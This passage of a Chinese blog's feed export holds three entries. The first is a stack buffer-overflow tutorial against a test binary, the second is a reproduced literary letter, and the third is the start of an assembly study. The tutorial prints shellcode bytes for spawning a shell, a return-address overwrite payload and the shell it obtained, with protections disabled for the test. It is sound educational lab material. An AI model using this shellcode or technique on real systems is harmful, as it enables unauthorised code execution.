&lt;p&gt;函数需要返回，有一条&lt;code class=&quot;highlighter-rouge&quot;&gt;leave&lt;/code&gt;指令，将&lt;code class=&quot;highlighter-rouge&quot;&gt;rbp&lt;/code&gt;拷贝到&lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt;中，相当于清除了为局部变量分配的空间，此时栈相当于：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x400584				;返回地址  	  &amp;lt;- 高地址
rbp（main）
					&amp;lt;-rbp,rsp	 &amp;lt;- 低地址
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;leave&lt;/code&gt;指令还有一个作用是弹栈，即将栈顶的数据弹出到&lt;code class=&quot;highlighter-rouge&quot;&gt;ebp&lt;/code&gt;中，也就恢复了main函数的堆栈帧，此时栈相当于：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x400584				;返回地址  	  &amp;lt;- 高地址
					&amp;lt;-rsp		 &amp;lt;- 低地址
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;接下来，有一条&lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt;指令，弹栈，即将栈顶的数据弹出到&lt;code class=&quot;highlighter-rouge&quot;&gt;rip&lt;/code&gt;中，因为&lt;code class=&quot;highlighter-rouge&quot;&gt;rip&lt;/code&gt;存储的是当前指令的地址，也就是将返回地址存入了下一个指令的地址，达到了控制权从read函数到main函数的目的。&lt;/p&gt;

&lt;p&gt;这时，思路就很清晰了，只需要合适的数据将返回地址覆盖，程序就会跳转到合适的地方。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/void0red/Pictures/master/blog/overflow_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02确定返回地址的偏移量&quot;&gt;0x02确定返回地址的偏移量&lt;/h2&gt;

&lt;p&gt;首先，我们需要确定输入到达返回地址所需字节数。&lt;/p&gt;

&lt;p&gt;可以使用&lt;code class=&quot;highlighter-rouge&quot;&gt;peda&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_creat&lt;/code&gt;创造一个40字节的字符串：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ pattern_create 40 a.txt
Writing pattern of 40 chars to filename &quot;a.txt&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;将字符串传入并执行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ r &amp;lt; a.txt 
Starting program: /home/void0red/Documents/pwn/test &amp;lt; a.txt
23333

Program received signal SIGSEGV, Segmentation fault.
[-------------------------------------code-------------------------------------]
   0x400589 &amp;lt;main+35&amp;gt;:	call   0x400430 &amp;lt;puts@plt&amp;gt;
   0x40058e &amp;lt;main+40&amp;gt;:	mov    eax,0x0
   0x400593 &amp;lt;main+45&amp;gt;:	leave  
=&amp;gt; 0x400594 &amp;lt;main+46&amp;gt;:	ret    
   0x400595:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x40059f:	nop
   0x4005a0 &amp;lt;__libc_csu_init&amp;gt;:	push   r15
   0x4005a2 &amp;lt;__libc_csu_init+2&amp;gt;:	push   r14
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;程序停在了&lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt;指令的地方，因为覆盖返回地址的是一串无意义的值，无法进行跳转，上一步操作将&lt;code class=&quot;highlighter-rouge&quot;&gt;rbp&lt;/code&gt;（寄存器）的值拷贝到&lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt;（寄存器）中，导致&lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt;指向了存储返回地址的栈空间，通过查看&lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt;指向的栈的数据，可以算出返回地址在栈中，相距未读入数据时栈顶的偏移量。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ x/wx $rsp
0x7fffffffdd08:	0x44414128
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;可以看出原本存放返回地址的的栈上现在存放的是&lt;code class=&quot;highlighter-rouge&quot;&gt;0x44414128&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;用&lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_offest&lt;/code&gt;计算偏移量&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ pattern_offset 0x44414128
1145127208 found at offset: 24
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;OK，偏移量为24，也就是说输入值的前24个字节是任意的（注意不要存在&lt;code class=&quot;highlighter-rouge&quot;&gt;\x00&lt;/code&gt;之类的字节，可能会导致读入终止），接在后面存入8个字节的地址，就能够实现跳转。&lt;/p&gt;

&lt;h2 id=&quot;0x03确定shellcode的地址&quot;&gt;0x03确定shellcode的地址&lt;/h2&gt;

&lt;p&gt;因为选择的&lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode地址&lt;/code&gt;为27字节，前面的填充数据要用24字节，合起来超过40字节，无法写入，不如将包含&lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode&lt;/code&gt;的指令放入系统环境，用于测试&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export PWN=`python -c 'print&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;'`
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;用&lt;code class=&quot;highlighter-rouge&quot;&gt;getenvaddr&lt;/code&gt;来确定&lt;code class=&quot;highlighter-rouge&quot;&gt;PWN&lt;/code&gt;变量对&lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt;输入的地址&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ export PWN=`python -c 'print&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;'`
$ ./getenvaddr PWN ./test
PWN will be at 0x7fffffffed03
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;得到地址&lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffed03&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x04编写payload&quot;&gt;0x04编写Payload&lt;/h2&gt;

&lt;p&gt;用python的struct模块写payload的话很方便&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;Q'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7fffffffed03&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'w'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pack&lt;/code&gt;函数用来处理数据很方便：）&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pack(format,var0,var1...)&lt;/code&gt;按照给定的格式(format)，把后面数据封装成字符串，&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt;是按照小端序，&lt;code class=&quot;highlighter-rouge&quot;&gt;Q&lt;/code&gt;是无符号的八字节整数&lt;/p&gt;

&lt;h2 id=&quot;0x05测试&quot;&gt;0x05测试&lt;/h2&gt;

&lt;p&gt;通过管道的方式输入文件的数据&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ (cat a.txt;cat)|./test 
23333

whoami
void0red
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;经过测试，确实的得到了shell&lt;/p&gt;

&lt;h2 id=&quot;0x06总结&quot;&gt;0x06总结&lt;/h2&gt;

&lt;p&gt;主要是搞清楚函数调用与返回时栈的变化，测试过程中关闭了防护措施&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ASLR&lt;/li&gt;
  &lt;li&gt;stack-protector&lt;/li&gt;
  &lt;li&gt;execstack&lt;/li&gt;
&lt;/ul&gt;

</content>
<category term="pwn" />
<summary>  this is a test, not true</summary>
</entry>
<entry>
<title>a letter</title>
<link href="http://localhost:4000/2017/11/05/a-letter.html" rel="alternate" type="text/html" title="a letter" />
<published>2017-11-05T00:00:00+08:00</published>
<updated>2017-11-05T00:00:00+08:00</updated>
<id>http://localhost:4000/2017/11/05/a letter</id>
<content type="html" xml:base="http://localhost:4000/2017/11/05/a-letter.html">&lt;blockquote&gt;
  &lt;p&gt;安妮宝贝《一封信》&lt;/p&gt;
&lt;/blockquote&gt;

&lt;embed src=&quot;//music.163.com/style/swf/widget.swf?sid=785757128&amp;amp;type=3&amp;amp;auto=1&amp;amp;width=278&amp;amp;height=32&quot; width=&quot;298&quot; height=&quot;52&quot; allownetworking=&quot;all&quot; /&gt;

&lt;p&gt;我想给你写封信。没有什么特别原因，现在也不知道你在哪里，过得可好，以及我们将会在何时何地相逢。告别之后，已经过去很多年。我在信中说些琐碎的言语，就像去探望母亲，早晨醒来彼此絮絮地说话。躺在床上，在刚亮的天色里说各自的心思，说完才起身去梳洗。能够温柔耐心地对话的人太少了。更多时候，更多人，他们关心的都是这个世界的虚假和热闹。&lt;/p&gt;

&lt;p&gt;//也许没有逻辑和秩序。也许颠倒了记忆和未来。这些都不重要。只要我在写，你在读。之前我只遇见过一个人，可以说话说到连心的缝隙也没有了。他住在很远的地方。我们说过那么的一次话之后，就告别了。但我知道，这样的告别之后，一定还会再见。&lt;/p&gt;

&lt;p&gt;每个人靠近我们都带着他宿世的要求和责任。如果无缘，就不会在茫茫人海中交际。如果缘尽，就会断然放下再无牵挂。如果心还在背负困难，就说明时间还没有到限。扛着它走，不要对抗，不要推卸，不要控制，不要试图解决。背着它一直往前走。现在如果有任何人问我关于困难的问题，我都会这样说。&lt;/p&gt;

&lt;p&gt;//过去不重要。过去不能累积起我们此刻的心情。幸好有无常，所以一直都会有变化。有时我也会想起一万公里之外，地球的某端，某个小镇。想起清晨微微有些冷的空气，树木的香气，碗里的樱桃，洗衣机的声音，走上楼梯时一盏一盏摁掉的灯。这仿佛是前生与你一起度过的日子。但大多数时候，我什么都记不得了。我把一切忘得干干净净。所以我现在一点都不害怕黑，也不害怕破碎的事物。因为我知道在这些背后，总有一种空无而透明的光芒闪烁着。色即是空，空即是色。说的就是这个。&lt;/p&gt;

&lt;p&gt;我猜想有很多人临终之前，会感觉自己的一生，没有真正地爱和被爱过。人类抵抗孤独，渴求和试图获取爱，最后却以虚荣、以怀疑、以欲望、以婚姻……以各种方式扼杀它。最终他们依然如同没有爱的动物，孤独地死去。我猜想，在人死去时，只有爱是唯一可以被带走的。但是大多数人没有这个。&lt;/p&gt;

&lt;p&gt;如果对方老了，你会悉心照顾，如果你去世，对方会为你安葬。做这些事情其实都不那么难，都未必需要相爱。可以是因为宿缘或者业力，也可以是出于善良和慈悲。爱是太高的奖赏，需要好几世的承诺和执迷不悟。普通人会被自己吓倒。&lt;/p&gt;

&lt;p&gt;世间的孤独有四种。我们和无法真正接纳自己的人有很深的因缘。他们认为自己在爱你，但爱的不是你的灵魂，是你需要修饰的表达和形式。你等待可以接纳自己的人，最后却越来越清楚地看到自己才是支点。一些人于是选择宗教，但宗教如果没有被真正地理解，又会成为他们的止痛片和鸦片。说真话总是会触犯别人，会被误解。最后一种是，始终需要相信。&lt;/p&gt;

&lt;p&gt;当人们真正相爱时，会看到对方婴儿般的灵魂，或者是对方的本来面目。他们就会不再那么需要一切看似庞大而无关的东西，也不关心这个社会或者同类会如何评价他们的生活。人们就可以抛弃掉这些虚假和热闹，而只是安静地互相陪伴，度过余生。只有在我们不相爱的时候，才会把对方看成有侵略性的，危险的，无法掌控的。人们才会需求物质和欢娱，金钱和声名，以这些爱的替代品填补内心的惶恐无助。&lt;/p&gt;

&lt;p&gt;//如果不能成为一个有纯度的容器，人接应不了真理，同样也无法承载极致的感情。佛陀一再在经文里说，对什么样的人才可说法，因为这清凉而滚烫的灌注有可能使你碎裂。同理，有些人因为自己的身心受限，一生都不会知道什么是真正的爱，真正的相信。&lt;/p&gt;

&lt;p&gt;//夏天时我去海边，半夜模糊醒来，看见落地窗外圆月下的大海，潮声汹涌。泛着银光的波浪好像在奔走，但其实哪里都没有去，不过是起起落落。世间大部分事情都如此虚妄，但在一些人心里却是坚定不移的。我想起日本人的审美观，瞬间的美丽可以拿性命去换。他们的偏执可说是一种无明，也可说是一种突破之后的洒脱。&lt;/p&gt;

&lt;p&gt;即便没有过错或罪恶，只是甘愿压抑和拖拉地过一生，也已经是身堕地狱。人还能如何穿透轮回？有勇气真实地活着，才是有力量的。《浮生六记》里面写道：夏月，荷花初开时，晚含而晓放。芸用小纱囊撮茶叶少许，置花心，明早取出，烹天泉水泡之，香韵尤绝。噫。质朴的细节，仿佛梦里逐花，又真实无比。只有被虚掷的不善美的时日，才跟假的一样。&lt;/p&gt;

&lt;p&gt;//如果人类不是为了完成本能的繁衍使命，看不出有何理由需要共处。但在超越性别之后，我们各自才有机会窥见彼此灵魂的暗示。轮回的灵魂最终需要的是融合，消失不见。最易腐朽的肉体却需求着纯属妄想的安全和长久。能够被表达清楚的，通常都不是重要的。那无法陈述的，无法脱卸的，无法展示的，无法传递的，才是重要的。&lt;/p&gt;

&lt;p&gt;//我记得那一天离开威尼斯的早上，听到房间外面传来剧烈的声响，打开旅馆窗户，发现因海风猛烈，船只桨橹在晃动。当时沉浸在这个声音中，仿佛发了愣，心里变得很安静。细节之中，隐藏着无常的美和动荡。人生充满荒诞。荒诞的美，荒诞的艰难。而人们在荒诞的梦中都活得太用力了。&lt;/p&gt;

&lt;p&gt;我只愿在时间中慢慢成为一个简单的人。遇见复杂的事情，知道睡一觉就过完了。事实也是如此。于是突然之间想清楚了一些事情。生命很短暂。在游戏，幻梦，谎言，戏剧，妄想之中，活在当下，这是唯一的意义。然后应该忘记，继续往前走。艰难的时段无一例外都会过去。快乐也是。如同人与人，在告别之后会再次重逢，或者永不再见。&lt;/p&gt;

&lt;p&gt;//如果有选择，你愿成为漂亮的轻快的花好月圆的人类，还是一个在完成任务的战士般的人类？你愿与人做平庸的神仙眷侣，还是一生跨越千山万水但孑然飘零？幸好，我们从没有得到过选择的权利。&lt;/p&gt;

&lt;p&gt;//我们只会相认自己的同类，并最终跟随他们。这种相认也并不局限于人。一座古老的桥，月光下盛开的花，隐隐雨声，四行诗，两盏茶……有些人与事物的呈现，带来和谐及宁静。人与人之间，开端于相认。如果想控制或改变自己所遇见的一切，就会彼此背向而走。&lt;/p&gt;

&lt;p&gt;//如果我们再次遇见，我希望自己爱你的方式，就如同爱着身边正在遇见或即将离开的陌生人。我会以爱其他人的方式去爱你，以爱你的方式去爱其他人。没有所谓的特别的爱，我们所有的人都是一样的。以彼此的痛苦为痛苦，以彼此的快乐为快乐。我正在学习如何去爱。&lt;/p&gt;

&lt;p&gt;//爱更多人，用爱做通道以使彼此能够走得远一些。即使是相爱的伴侣，也应把他当作其中的一员，而不是单独的一个。没有慈悲和承担的感情，走不了远路。在一起，不是为了欢娱，是为了完成。&lt;/p&gt;

&lt;p&gt;//这世间万般幻象都只是心的镜像。憎嫌他人，未必对方有错误，也许只是自己的心被障碍遮蔽。心生喜悦，未必对方多值得赞颂，是这颗心原本就有的情意。如何对待自己，就会如何对待他人。如果对他人有恨意，警惕此刻的心也许抱有投诸对方的期待和恐惧。完整的内心模式，不需迎合或供给。如果能够扩展心量，装下任何一个人，看起来会如同谁都不爱。&lt;/p&gt;

&lt;p&gt;//是的。容器只有清空，才可能试图承载无限。对我来说，重要的事情，不是投入地热爱或忘记。而是无限地热爱或忘记。&lt;/p&gt;

&lt;p&gt;//从本质而言，人，生而孤独。得到伴侣，不是为了填充寂寞或让对方充当令自己快乐的工具。身心合一的标准是，在彼此给予亲密、照顾、关怀、欢爱的世俗内容的同时，生命应因对方的存在而获得更高级别的提升。在关系的修炼中获得实证，这是与自己与他人合一的途径之一。因此，爱对我们来说始终重要。但这种爱，并不仅是指一种亲密或契约的关系。&lt;/p&gt;

&lt;p&gt;//无限制的爱，也许是一种悲心，不是被欲望和业力纠葛的小爱。希望眼前这个人是快乐的，希望对他的生命有所助益，而非伤害与损毁。不管他是谁，出现多久。&lt;/p&gt;

&lt;p&gt;//我远方的朋友说，你要离花近一些。当花开放，它付出生命里此刻全部的能量，是竭尽全力，毫不保留的。这本是接近终结的时刻，但它却这般宁静。全然的相信之后，才会有全然的接纳。而当我们处于修复的过程之中，有时会发现自身存在着一种无需修复的完美。&lt;/p&gt;

&lt;p&gt;//他又说，爱不是把自己当做救世主，要求对方改变。爱是牺牲，把自己化作空气，与对方融为一体。最困难的不是给予，是接纳。接纳即是允许发生，如此便可以熄灭我们的期待和忧虑。很多事情只是我们的方式，并非目标。不能把方式当做目标。&lt;/p&gt;

&lt;p&gt;//所以我们不应有追求空性的执着，但也没有丝毫的消极。可以全心全意做完一件事情，也可以什么都不做。可以用全部身心爱一个人，也可以消失。没有黏滞和妄求的内在，这是一种训练。每个人都需要掌握一些可通过训练得到的基本的技巧，知道如何不伤害自己。只有懂得不伤害自己，才可能做到不去伤害别人，伤害身边的事物。&lt;/p&gt;

&lt;p&gt;//所以，真实的生活即是，认真做好每一天分内的事情。不索取无关的远景。不纠缠于多余情绪和评断。不妄想，不在其中自我沉醉。不伤害，不与自己和他人为敌。不表演，也不相信他人的表演。&lt;/p&gt;

&lt;p&gt;//“你当下周围发生的事情全都是你心性的映照。也就是说，是你的心和念头创造了这个世界。”你相信这段话吗？我相信。这个相信或不信，会决定我们各自的生活方式和价值观点。但这里面没有区分之心。即便见到各种软弱、局限，不管来自他人还是自己，我知道一切均是自然合理。没有美丑，也不存在善恶，只是人类各自的属性所得到的命运。&lt;/p&gt;

&lt;p&gt;//只是，很多人活在自己的世界里，喜欢，骄傲，他们不必相信，也不用听懂其他的话。任何外在的改变都是形式。心，只需要自己发生的改变。&lt;/p&gt;

&lt;p&gt;//人除了自己醒来，无人可帮。只有经历自己对他人的穷追猛打，再经历一次他人对你的穷追猛打，会看到自己曾经有过的错误，和一些做法的不可理喻。再走一段弯路，然后自己醒来或一直不醒。人是多么僵硬和自傲的动物，充满对他人的妄想和断论，却只需要对方配合和服从自己。&lt;/p&gt;

&lt;p&gt;//那些可以轻而易举伤害我们的人，那些一再以痛楚和挫败试探我们的人，那些举起旗子引导我们走入迷途深林的人，那些在削弱我们的力量的人，那些让我们深深触动和粉碎自我的人，他们才是生命中最有力量的老师。如你我这般的俗人，只有真正穿行过黑暗与障碍，才能成为发出微光的人。我从不相信任何借口、理由、托辞、辩论。我只相信我们曾经走过的路。”&lt;/p&gt;

&lt;p&gt;//时间带来行为和意愿的回报。种子若被日光照耀，会开花结果。我们即便是一群时时失去自知的农人，面对的依然是一片井然有序的土地——收获会是什么，以及可曾照料这些被双手埋入泥土之中的种子。&lt;/p&gt;

&lt;p&gt;//有人说，有时也许只是自己内心的美好投射给他人，使一些存在变得美好。但这的确是一个工作，并且与他人无关。你所做的一切首先是要使自己的负面源泉被切断，不要让它像火焰一样四处去点燃更多人的烦恼和嗔恨。使自己和他人流淌出清凉，这是一种累积。见到，一切均是心的轨道，虚弱归于肤浅，质朴归于纯真。&lt;/p&gt;

&lt;p&gt;//如果没有得到想要的，那是因为的确还没有做到足够的好，无法做到平等地与任一人分享内在的美好。没有其他理由。而在心真正清楚的时候，我们所遇见的每一个人每一件事每一段风光，都可以带来意义。&lt;/p&gt;

&lt;p&gt;//有时我想，所有人都是一样的。在各自粉饰的外表下都有千疮百孔的人生和一个暗黑的深渊。如果了知这些，不会觉得自己特别，也不会觉得自己无辜。时间飞逝，人生百味杂陈，无法言说。仿佛一个人写了长长的信，但未等到那个可以投递的人。被阅读被接纳被理解是奢侈的。此刻做一个可以独自静静写信的人，也已不错。&lt;/p&gt;

&lt;p&gt;//我是个旧式样的人，喜欢用手工慢慢做东西的时代。那个时代，有人跋涉千山万水只为相见一面，鸿雁往来耐心等待，春夜无事庭院中闲坐，聆听雨水跌在芭蕉叶上，盖一座亭阁只为观望盛开的杏花。如果遇见生命中一个重要的人，我知道，在我等待他良久的时候，他也已经等待我良久。我们各自都应该是美而好的。&lt;/p&gt;

&lt;p&gt;//如同昨日我去买盆景，看到一对老人头发白了，气定神闲，容色干净，照料着姿态古雅的盆景。盆景也像它们的主人。我买了一盆大阪松，一盆垂丝海棠。什么样的人，种出什么样的东西。把盆景搁置好，桃花枝和白梅养在清水中。我想当我们遇见，将会找到一个地方，看花，喝茶，并肩坐着，说些絮絮叨叨温柔而轻声的话。不知不觉，就让岁月又翻了一页。&lt;/p&gt;

&lt;p&gt;如果在任何变化中存在着接纳和顺受，那么即便是终结，也依然呈现着优雅和自在。最终一切逝灭都会朝向新生。&lt;/p&gt;

&lt;p&gt;一切都有期限。只需往前走。执着过的，放空了。拖累过的，分解了。困顿过的，单纯了。被击伤过的，越过了它。如此，即便是有着微微伤感，也如同被清洗。若此刻没有一丝的期待或恐惧，就是当下最为完美的时分。而那一刻，心就像那秋天树枝上饱满的果实，悬挂着，知道会坠落，无念无想，不忧不虑，只是随顺因缘。&lt;/p&gt;

&lt;p&gt;如此，天上一年，人间一世。&lt;/p&gt;

&lt;p&gt;我从不奢望长久，只希望活得彻底。燃烧充分，展示出纯度。不停上演的生老病死，论证这个物质世界的变幻无常和岌岌可危。我们已知道它的苦，就可以快乐而不复杂地参与它的游戏。&lt;/p&gt;

&lt;p&gt;最漫长的爱，其实是与自己相爱。但如果某天，我遇见了你，会邀请你一起与我跃入海洋。只有当我们各自成为渺小的水珠，彼此才会永恒地在一起。如同一段我所喜欢的经文：“世界是一座桥梁，你可以跨过它，但不要在其上建房。”我们的爱，也是如此。&lt;/p&gt;
</content>
<category term="others" />
<summary>  安妮宝贝《一封信》</summary>
</entry>
<entry>
<title>try_assembly_0</title>
<link href="http://localhost:4000/2017/10/21/try_assembly_0.html" rel="alternate" type="text/html" title="try_assembly_0" />
<published>2017-10-21T00:00:00+08:00</published>
<updated>2017-10-21T00:00:00+08:00</updated>
<id>http://localhost:4000/2017/10/21/try_assembly_0</id>
<content type="html" xml:base="http://localhost:4000/2017/10/21/try_assembly_0.html">&lt;blockquote&gt;
  &lt;p&gt;if-else, while/for, switch-case&lt;/p&gt;

  &lt;p&gt;编译器：&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;if-else&quot;&gt;if-else&lt;/h2&gt;
&lt;p&gt;一段c的代码&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;equal&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;233&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;用&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -c if-else.c&lt;/code&gt;得到目标文件&lt;/p&gt;

&lt;p&gt;用&lt;code class=&quot;highlighter-rouge&quot;&gt;objdump -S if-else.o&lt;/code&gt;查看代码段的汇编&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0:	55                   	push   %rbp
   1:	48 89 e5             	mov    %rsp,%rbp
   4:	48 83 ec 10          	sub    $0x10,%rsp
   8:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%rbp)
   f:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%rbp)
  16:	8b 45 f8             	mov    -0x8(%rbp),%eax
  19:	3b 45 fc             	cmp    -0x4(%rbp),%eax
  1c:	75 11                	jne    2f &amp;lt;main+0x2f&amp;gt;
  1e:	bf 00 00 00 00       	mov    $0x0,%edi
  23:	b8 00 00 00 00       	mov    $0x0,%eax
  28:	e8 00 00 00 00       	callq  2d &amp;lt;main+0x2d&amp;gt;
  2d:	eb 0f                	jmp    3e &amp;lt;main+0x3e&amp;gt;
  2f:	bf 00 00 00 00       	mov    $0x0,%edi
  34:	b8 00 00 00 00       	mov    $0x0,%eax
  39:	e8 00 00 00 00       	callq  3e &amp;lt;main+0x3e&amp;gt;
  3e:	b8 00 00 00 00       	mov    $0x0,%eax
  43:	c9                   	leaveq 
  44:	c3                   	retq   
